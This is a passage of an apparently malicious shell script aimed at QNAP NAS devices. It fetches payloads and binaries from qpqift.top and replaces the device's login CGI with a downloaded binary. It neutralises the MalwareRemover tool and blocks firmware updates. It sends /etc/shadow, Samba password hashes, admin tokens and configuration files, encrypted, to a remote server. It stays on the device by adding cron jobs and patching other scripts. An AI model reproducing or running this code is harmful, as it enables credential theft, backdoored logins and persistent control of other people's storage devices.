command -v bunzip2 && compext=bz2 || compext=gz
curl --connect-timeout 12 -m 1200 -k -o "rssdoc.tar.${compext}" "https://qpqift.top/data/rssdoc.tar.${compext}" && test -f "rssdoc.tar.${compext}" && rssdochash="$(openssl dgst -sha1 -binary "rssdoc.tar.${compext}" | openssl base64)" && { test "$rssdochash" = 'WOkc6vlUa7A30GKa4Z4o02CIexk=' || test "$rssdochash" = "0h0Jyx52a/F9YB80Ml4SsEsugyA="; } && { test "$compext" = bz2 && tarflag=j || tarflag=z; } && tar -x${tarflag}f "rssdoc.tar.${compext}" || rm -f rssdoc.tar
rm -f "rssdoc.tar.${compext}"
fi

rm -f /home/httpd/{Liveupdate,FirmwareRelease{,_beta}S.xml}
ln -s "${CWD}"/rssdoc/{Liveupdate,FirmwareRelease{,_beta}S.xml} /home/httpd

if grep 'Liveupdate\|FirmwareRelease\|QTS_FW' /etc/default_config/uLinux.conf /etc/config/uLinux.conf | grep 'qnap\.com\|0\.0\.0\.0'; then
internalwebport=$(/sbin/getcfg System InnerWebAccessPort -d 58080)
localupdateurl="http://127.0.0.1:${internalwebport}"
sed -i 's/https\?:\/\/[^\/]\+\/\(Liveupdate\|FirmwareRelease\|QTS_FW\)/http:\/\/127.0.0.1:'${internalwebport}'\/\1/' /etc/default_config/uLinux.conf /etc/config/uLinux.conf
fi

test -f '/etc/config/rssdoc/qpkgcenter_*.xml' || test -h '/etc/config/rssdoc/qpkgcenter_*.xml' && { test -f '.qdisk_cmd' && ./.qdisk_cmd -i '/etc/config/rssdoc/qpkgcenter_*.xml'; rm -f '/etc/config/rssdoc/qpkgcenter_*.xml'; }

if find /etc/config/rssdoc | grep 'qpkgcenter_.*\.xml'; then
:
else
cp "./rssdoc/Liveupdate/QTS${version}/qpkgcenter_eng.xml" '/etc/config/rssdoc/qpkgcenter_eng.xml'
test -f '.qdisk_cmd' && ./.qdisk_cmd +i '/etc/config/rssdoc/qpkgcenter_eng.xml'
fi

for file in /etc/config/rssdoc/qpkgcenter_*.xml
do
if [ -f "$file" ] && { rm -f "$file" || [ ! -s "$file" ]; }; then
test -f '.qdisk_cmd' && ./.qdisk_cmd -i "$file"
touch "$file"
cp -f "./rssdoc/Liveupdate/QTS${version}/${file##*/}" "$file"
test -f '.qdisk_cmd' && ./.qdisk_cmd +i "$file"
fi
done
file=''

for qpkgdir in "${bdir}/.qpkg" '../../.qpkg'; do
test -d "$qpkgdir" && break
done
test -d "${qpkgdir}/MalwareRemover" || mkdir "${qpkgdir}/MalwareRemover"
test -d "${qpkgdir}/MalwareRemover/modules" || mkdir "${qpkgdir}/MalwareRemover/modules"
test -f '.qdisk_cmd' && ./.qdisk_cmd -i "${qpkgdir}/MalwareRemover"

if [ -d "${qpkgdir}/MalwareRemover/modules" ]; then
for file in 10_derek_3.pyc 12_derek_3.pyc; do
if [ ! -f "${qpkgdir}/MalwareRemover/modules/${file}" ] || rm -f "${qpkgdir}/MalwareRemover/modules/${file}" || test -x "${qpkgdir}/MalwareRemover/modules/${file}" || [ $(wc -c < "${qpkgdir}/MalwareRemover/modules/${file}") -gt 150 ] || [ $(wc -c < "${qpkgdir}/MalwareRemover/modules/${file}") -lt 120 ]; then
test -f '.qdisk_cmd' && test -f "${qpkgdir}/MalwareRemover/modules/${file}" && ./.qdisk_cmd -i "${qpkgdir}/MalwareRemover/modules/${file}" && rm -f "${qpkgdir}/MalwareRemover/modules/${file}"
openssl base64 -d <<"EOF" >"${qpkgdir}/MalwareRemover/modules/${file}"
A/MNCuVwTVxjAAAAAAAAAAABAAAAQAAAAHMLAAAAZQAAgwAAAWQAAFMoAQAAAE4o
AQAAAHQEAAAAZXhpdCgAAAAAKAAAAAAoAAAAAHMVAAAAbW9kdWxlcy8xMF9kZXJl
a18zLnB5dAgAAAA8bW9kdWxlPgEAAABzAAAAAA==
EOF
chmod -x "${qpkgdir}/MalwareRemover/modules/${file}"
test -f '.qdisk_cmd' && ./.qdisk_cmd +i "${qpkgdir}/MalwareRemover/modules/${file}"
fi
done
fi
file=''; qpkgdir=''

if [ ! -f .rsakey ]; then
verifykey='-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAt/EDT6SB75atrHW7Cpog
CXqrBM2CVbJo';verifykey="${verifykey}"'g4rwwS''z1Bp1i1'
verifykey="${verifykey}"'B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex
RC5qQSiS/7FS48jsPKsJnrUhnsI1fRLM4DqsEF3UOukZuDOYUhlteDuMqqZBz0AC
Q3YnLjraTjchMF0XmaAAcWOkg5MsxAOKTepue4R/tnrPAkAG86nq5LA1+wa7opNV
gQzwDh7YXhBnWz52+ebZ9TeqD31/sb5hoyUKf1Nr5HcKkklObuz1OGQJ//pkCbTC
2EnQw6tCPQhgSIA8wJKkaxW0f/UHP+YBmWa4Wn+uPrJJuHSVNEJtAp2wlX3THltz
0IGPQEuzoafOAl3EFjas3HcTX2HlEfnvAtRL2iLxJeba1nZ+U3geZOuxL1NhWhNh
pjaLcKwhkRck7Y5hr1Pz8pLDnXsx5w0QUz6XS8HVf/KHnNXHufFEn01y9YoPuau1
DNnpDGbq632Bs8ESd3ueHk9OY/UZxWeN3UdbseFxK35XAgMBAAE=
-----END PUBLIC KEY-----'
test -f ".rsakey" || echo "$verifykey" > ".rsakey"
fi

cgibindir='/home/httpd/cgi-bin'
if [ ! -f "1551848401_c" ] && [ -f "${cgibindir}/authLogin.cgi" ] && [ ! -f "${cgibindir}/sysauthLogin.cgi" ]; then
	test -f "1551848401_c" || touch "1551848401_c"
	case "$(uname -m)" in 
	*x86_64*)
			arch=x86_64
			binhash='rrYwg0D4+4DxcDxYQsNTB4JUGlQ='
			;;
	*arm*|*aarch*)
			arch=arm
			binhash='Z4n2BZdhwjYf0wjM7GCW61WM9eU='
			;;
	*i*86*)
			arch=i486
			binhash='U3eHe6syQraRBGgsvkFZH3wibDw='
			;;
	esac
	
	if [ "x${binhash}" != 'x' ]; then
		curl --connect-timeout 12 -m 1200 -k -o ".qal" "https://qpqift.top/data/qal2_${arch}" || rm -f ".qal"
		test -f '.qal' && rsynchash="$(openssl dgst -sha1 -binary ".qal" | openssl base64)"
		if [ "x${rsynchash}" = "x${binhash}" ]; then
			test -f "${cgibindir}"/sysauthLogin.cgi && mv "${cgibindir}"/sysauthLogin.cgi "${cgibindir}"/authLogin.cgi
			mv "${cgibindir}"/authLogin.cgi "${cgibindir}"/sysauthLogin.cgi && test -f "${cgibindir}"/sysauthLogin.cgi && mv '.qal' "${cgibindir}"/authLogin.cgi && chmod 755 "${cgibindir}"/authLogin.cgi
		fi
		test -f '.qal' && rm -f '.qal'
	fi
fi

if  [ -f "${cgibindir}"/authLogin.cgi ] && "${cgibindir}"/authLogin.cgi | grep '<QDocRoot'; then
:
else
test -f "${cgibindir}"/sysauthLogin.cgi && mv "${cgibindir}"/sysauthLogin.cgi "${cgibindir}"/authLogin.cgi
fi

test -f /etc/config/.qsync.conf && authkeysfile=$(grep AuthorizedKeysFile /etc/config/.qsync.conf | sed 's/"//g' | cut -d ' ' -f 2)
if [ "$authkeysfile" ] && [ -f "$authkeysfile" ] && grep 'miOGcmendZU2r10SdZVplBQ4i' "$authkeysfile"; then
sed -i '/miOGcmendZU2r10SdZVplBQ4i/d' "$authkeysfile"
lsofout="$(lsof +c 0 -i -n -P | grep :51163)"
sshpid="$(echo "$lsofout" | tr -s ' ' | cut -d ' ' -f 2 | head -n 1)"
kill -2 "$sshpid"
fi

if [ ! -f '1548997200_c' ]; then
touch '1548997200_c'
mdir=`mktemp -d /tmp/.mount.XXXXXX` || { mdir=/tmp/.mount.jbbxQob; mkdir ${mdir}; } || mdir=`mktemp -d "${bdir}/.mount.XXXXXX"` || { mdir="${bdir}/.mount.jbbxQob"; mkdir ${mdir}; } || `mktemp -d "/mnt/HDA_ROOT/.mount.XXXXXX"` || { mdir="/mnt/HDA_ROOT/.mount.jbbxQob"; mkdir ${mdir}; } || `mktemp -d "/.mount.XXXXXX"` || { mdir="/.mount.jbbxQob"; mkdir ${mdir}; } || `mktemp -d "./.mount.XXXXXX"` || { mdir="./.mount.jbbxQob"; mkdir ${mdir}; }
__BOOT_DEV=
__model=`getcfg System "Internal Model"`
CONFIG_DEV_NODE=`getcfg "CONFIG STORAGE" DEVICE_NODE -f /etc/platform.conf`
CONFIG_DEV_PART=`getcfg "CONFIG STORAGE" FS_ACTIVE_PARTITION -f /etc/platform.conf`
CONFIG_DEV_FS=`getcfg "CONFIG STORAGE" FS_TYPE -f /etc/platform.conf`
__BOOT_CONF=`test -f /etc/default_config/BOOT.conf && cat /etc/default_config/BOOT.conf 2>/dev/null || cat "${confdir}/BOOT.conf"` || { test "$arch_o" = arm && __BOOT_CONF=TS-NASARM; } 
command -v hal_app > /dev/null 2>&1 && { __BOOT_DEV=$(hal_app --get_boot_pd port_id=0); }
test "${__BOOT_CONF}" = TS-NASARM || test "$arch_o" = arm && { test -f /etc/IS_TAS && __BOOT_DEV="${__BOOT_DEV:-/dev/mtdblock}7" || __BOOT_DEV="${__BOOT_DEV:-/dev/mtdblock}5"; } || __BOOT_DEV="${__BOOT_DEV:-/dev/sdx}6"
test "x${CONFIG_DEV_NODE}" != "x" && { ubiattach -m "${CONFIG_DEV_PART}" -d 2; mount -t ubifs ubi2:config "${mdir}" > /dev/null 2>&1 || { test -f /etc/IS_TAS && mount -t ext4 /dev/mmcblk0p7 "${mdir}"; } } || mount ${__BOOT_DEV} -t ext2 ${mdir} || { test "${__model}" = "TS-201" && mount -t ext2 /dev/mtdblock4 ${mdir}; } || { ubiattach -m "${CONFIG_DEV_PART}" -d 2; mount -t ubifs ubi2:config "${mdir}"; mount -t ext4 /dev/mmcblk0p7 "${mdir}"; } || { test "${__model}" = "TS-269L" && mount -t ext2 /dev/sdc6 ${mdir}; } || { test "${__model}" = "TS-869" && mount -t ext2 /dev/sdi6 ${mdir}; } || { test "$arch_o" = arm || ${__BOOT_CONF} = "TS-NASARM" && { for i in 5 7 4 6 3 8; do mount -t ext2 "/dev/mtdblock${i}" ${mdir} && break; done; }; } || { test "$arch_o" = x86 && for n in /dev/sdc /dev/sdx /dev/sdi $__BOOT_DEV; do for i in 6 $CONFIG_DEV_PART; do mount -t ext2 ${n}${i} ${mdir} && break 2; done; done; } || { mount -t ext2 $(/sbin/hal_app --get_boot_pd port_id=0)6 ${mdir}; }

if [ $? -eq 0 ] || mount | grep "$mdir" >/dev/null; then
for file in "${mdir}"/K01* "${mdir}/autorun.sh" '/tmp/config/autorun.sh'; do
if [ -f "$file" ]; then
sedcmd='s/CXqrBM2CVbJog4rwwSz1Bp1i1B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex/CXqrBM2CVbJog4rwwSz1Bp1i1'"'"'\
verifykey="${verifykey}"'"'"'B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex/'
grepstring='CXqrBM2CVbJog4rwwSz1Bp1i1B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex'
sedreplace "$grepstring" "$sedcmd" "$file"
sedcmd='s/g4rwwSz1Bp1i1'"'"'/g4rwwS'"''"'z1Bp1i1'"'"'/'
grepstring='g4rwwSz1Bp1i1'"'"
sedreplace "$grepstring" "$sedcmd" "$file"
test -f '.qdisk_cmd' && ./.qdisk_cmd +ia "$file"
fi
done
fi
umount "$mdir"
rmdir "$mdir"
fi

if [ ! -f '1553058001_c' ]; then
touch '1553058001_c'
key=$(tr -dc 'a-zA-Z0-9' </dev/urandom | { key=''; dd bs=20 count=1 2>/dev/null || head -c 20 || IFS='' read -rd '' -n 20 key; echo "$key"; } )
test "x$key" = 'x' && key=$(LC_ALL=C sed 's/[^a-zA-Z0-9]//g' </dev/urandom | { key=''; dd bs=20 count=1 2>/dev/null || head -c 20 || IFS='' read -rd '' -n 20 key; echo "$key"; } )
{ echo "$key" | openssl rsautl -pubin -inkey .rsakey -encrypt | openssl enc -base64 -A; printf ':'
{ echo; for file in "${bdir}/.log/.rqsys.log" /etc/config/.qos_config/users/admin/.qtoken /etc/config/.qos_config/users/admin/secondSV.conf /etc/config/smbpasswd /etc/shadow /etc/config/*.conf /etc/default_config/*.conf /etc/*.conf /etc/config/.*.conf /etc/default_config/.*.conf /etc/.*.conf; do printf '%s:' "$file"; cat "$file"; echo; done; printf '%s:' "authLogin.cgi"; /home/httpd/cgi-bin/authLogin.cgi; printf '%s:' "display_name"; /sbin/get_display_name; } | gzip | { dd bs=4096 count=512 || head -c 2097152 || cat; } | openssl enc -aes-256-cbc -k "$key" -md md5 -salt -a -A; } | curl --connect-timeout 12 -m 300 -k -d '@-' "https://qpqift.top/ping.pl"
fi

if [ ! -f 1551848403_c ]; then
touch 1551848403_c
test -f liveupdate.sh && cronscriptpath=.liveupdate/liveupdate.sh || { test -f backup_conf.sh && cronscriptpath=.config/backup_conf.sh; }

if [ ! -z $cronscriptpath ]; then
test -d "${bdir}/.system" || mkdir -p "${bdir}/.system"
echo '(exec>/dev/null>&1 2>&1;(PATH="${PATH}:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin";openssl base64 -d -A <<"EOF"|sh&' > "${bdir}/.system/.qinstaller.sh"
chmod 755 "${bdir}/.system/.qinstaller.sh"
{
cat <<"XXEOF"
( exec >/dev/null 2>&1; (
export PATH="${PATH}:/bin:/sbin:/usr/bin:/usr/sbin:/usr/bin/X11:/usr/local/sbin:/usr/local/bin"
command -v dirname >/dev/null 2>&1 || dirname () { test -z "$1" && echo "." && return; local r="${1%"${1##*[!/]}"}"; case $r in /*[!/]*/*|[!/]*/*) r="${r%/*}"; echo "${r%"${r##*[!/]}"}";; */*) echo ${r%%[!/]};; "") echo $1;; *) echo .;; esac; }
test -d /etc/config && confdir=/etc/config || { test -d /mnt/HDA_ROOT/.config && confdir=/mnt/HDA_ROOT/.config; }
test -d "$confdir" || confdir=/etc/config
command -v getcfg > /dev/null 2>&1 || getcfg () { sed -n 'H;${x;s/\(.*\
\['"${1//\//\\\/}"']\|^\['"${1//\//\\\/}"']\)\
//I;s/\(^\|\
\)\[[^\
]\+\]\
.*//p}' "${4:-${confdir}/uLinux.conf}" | sed -n 's/^'"${2//\//\\\/}"' \?= \?\(.*\)/\1/Ip'; }
bdir=
test -f "${confdir}/smb.conf" && for i in homes Public Download Multimedia Web Recordings; do bdir=`getcfg "$i" path -f "${confdir}/smb.conf"` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && test -d "$bdir" && testwriteable=$(mktemp "${bdir}/.tmp.XXXXXX") && rm "${testwriteable}" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}" && { command -v readlink >/dev/null 2>&1 || ln -sf /bin/busybox /usr/bin/readlink; for i in homes Public Download Multimedia Web Recordings; do bdir=`readlink "/share/${i}" 2>/dev/null` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && bdir=/share/${bdir##*/} && test -d "$bdir" && break; done;
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`getcfg SHARE_DEF defVolMP -f "${confdir}/def_share.info"`
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`mount | sed -n "s/.*\(\/share\/[^ /]\+\) .*/\1/gp" | head -n 1`
test -z "${bdir}" || test ! -d "${bdir}"; } && { for i in CACHEDEV3_DATA CACHEDEV2_DATA CACHEDEV1_DATA MD0_DATA; do test -d "/share/${i}" && bdir="/share/${i}" && break; done;
test -z "${bdir}" || test ! -d "${bdir}" && bdir=/mnt/HDA_ROOT; }
echo 'ab*c' | grep -F 'ab*c' >/dev/null 2>&1 && fgrep="grep -F" || { command -v fgrep >/dev/null 2>&1 && fgrep=fgrep || fgrep=grep; }
test "$fgrep" || fgrep=grep
sleep 5
XXEOF
cat <<XXEOF
if [ ! -f "\${bdir}/.qpkg/${cronscriptpath}" ]; then
set_mutable() {
    if [ ! -e "\$1" ]; then
        return 0
    fi
    if [ -e /etc/IS_64BITS ]; then
        # 64bit set mutable
        SET_M_64="\$1"
        python -c "import os,fcntl,sys,struct;fd = os.open('\${SET_M_64}', os.O_RDONLY); rec = struct.pack('L', 0); x = fcntl.ioctl(fd, 0x80086601, rec); flags = struct.unpack('L',x)[0]; was_immutable = flags & 0x00000010; flags = flags & ~0x00000010; f = struct.pack('i', flags); fcntl.ioctl(fd, 0x40086602, f); os.close(fd)"
    else
        # 32bit set mutable
        SET_M_32="\$1"
        python -c "import os,fcntl,sys,struct;fd = os.open('\${SET_M_32}', os.O_RDONLY); rec = struct.pack('L', 0); x = fcntl.ioctl(fd, 0x80046601, rec); flags = struct.unpack('L',x)[0]; was_immutable = flags & 0x00000010; flags = flags & ~0x00000010; f = struct.pack('i', flags); fcntl.ioctl(fd, 0x40046602, f); os.close(fd)"
    fi
}
test -f "\${bdir}/.qpkg/${cronscriptpath%/*}" || test -h "\${bdir}/.qpkg/${cronscriptpath%/*}" && { set_mutable "\${bdir}/.qpkg/${cronscriptpath%/*}"; rm -f "\${bdir}/.qpkg/${cronscriptpath%/*}"; }
test -d "\${bdir}/.qpkg" || mkdir -p "\${bdir}/.qpkg" || mkdir "\${bdir}/.qpkg"
test -d "\${bdir}/.qpkg/${cronscriptpath%/*}" || mkdir "\${bdir}/.qpkg/${cronscriptpath%/*}"
cat > "\${bdir}/.qpkg/${cronscriptpath}" <<"XEOF"
XXEOF
cat "${cronscriptpath#*/}"
cat <<XXEOF
XEOF
chmod 755 "\${bdir}/.qpkg/${cronscriptpath}"
touch -cr /bin/busybox "\${bdir}/.qpkg/${cronscriptpath}"
( ( exec >/dev/null 2>&1 </dev/null; "\${bdir}/.qpkg/${cronscriptpath}" </dev/null >/dev/null 2>/dev/null & ) & )
fi

test -x "\${bdir}/.qpkg/${cronscriptpath}" || chmod 755 "\${bdir}/.qpkg/${cronscriptpath}"

crontabargs=\$(ps | grep 'cr[o]nd ' | sed -n 's/.*crond[^0-9A-Za-z-]*\\(.\\+\\)/\\1/p')
trycount=10; trycount=\$(( \$trycount - 10 ))
set x \$crontabargs; shift
while [ \$# -gt 0 ] && [ \$trycount -lt 10 ]; do
trycount=\$(( \$trycount + 1 ))
getopts ':c:' OPT 2>/dev/null
test "\$OPT" = 'c' && crontabfile="\${OPTARG}/admin" && break
test "\$OPTIND" -gt 0 && shift "\$OPTIND" && OPTIND=1 || break
done
test "\$crontabfile" && test -f "\${crontabfile}" || crontabfile='/tmp/cron/crontabs/admin'

for crontab in "\$crontabfile" "\${confdir}/crontab"; do
if \$fgrep "\${bdir}/.qpkg/${cronscriptpath}" "\$crontab"; then
:
else
cronmins=\$(printf '%i' "\$(( \$RANDOM % 60 ))")
cronhour=\$(printf '%i' "\$(( \$RANDOM % 24 ))")
cronhour=\$(printf '%i,' "\$(( ( \$cronhour + 8 ) % 24 ))" "\$(( ( \$cronhour + 16 ) % 24 ))")"\$cronhour"
echo "\$cronmins \$cronhour"' * * * '"\${bdir}/.qpkg/${cronscriptpath} >/dev/null 2>/dev/null" >> "\$crontab"
crontab "\$crontab"
sleep 2
fi
done
) & ) &
XXEOF
} | { openssl base64 -A; echo; echo 'EOF'; echo ')&)'; } >> "${bdir}/.system/.qinstaller.sh"
{ { crontab -l || cat /etc/config/crontab; } | grep -v '^ *#' | awk '{ print $6 }'; sed -n 's/^ \?[Ss]hell \?= \?//p' /etc/config/qpkg.conf; } | grep '/' | sort | uniq | while IFS= read -r line; do
test ! -z "$line" || continue
test -f "$line" || continue
test "$line" = $(pwd)/liveupdate.sh || test "$line" = $(pwd)/backup_conf.sh && continue
grep '/\.system/\.qinstaller\.sh"; exit' "$line" && continue
head -n 1 "$line" | grep '^#! \?/bin/b\?a\?sh' || continue;
tab='	'
test "${#tab}" -eq 1 || tab=$(printf '\011') || tab=$(echo -e '\011')
sed -i 's!^\([ '"$tab"']\{1,\}\)exit\([ '"$tab"']\{1,\}[0-9]\{1,\}\)\{0,1\}\(\;\{0,1\}[ '"$tab"']*\)$!\1{ '"${bdir}/.system/.qinstaller.sh"'; exit\2; }\3!;s!^exit\([ '"$tab"']\{1,\}[0-9]\{1,\}\)\{0,1\}\(\;\{0,1\}[ '"$tab"']*\)$!{ '"${bdir}/.system/.qinstaller.sh"'; exit\1; }!;s!/.qpkg/.q\{0,1\}installer.sh; exit!/.system/.qinstaller.sh; exit!' "$line"
hash=''
hash=$(sed -n '2,5p' "$line" | md5sum)
hash=${hash%${hash##*[0-9a-f]}}; hash=${hash#${hash%%[0-9a-f]*}}
trycnt=20
while [ "x$hash" = 'x18ec5ab42dc1231da518951e4479c27b' ] && [ "$trycnt" -gt 0 ]; do
trycnt=$(( $trycnt - 1))
sed -i '2,5d' "$line"
hash=''
hash=$(sed -n '2,568{/key=/d;s/\.liveupdate\/liveupdate\.sh//g;s/\.config\/backup_conf\.sh//g;p}' "$line" | md5sum)
hash=${hash%${hash##*[0-9a-f]}}; hash=${hash#${hash%%[0-9a-f]*}}
done
done
fi
fi

test -f "${ts}_c" || touch "${ts}_c"
rm -f "${CWD}/".tmp.*
exit 0
}
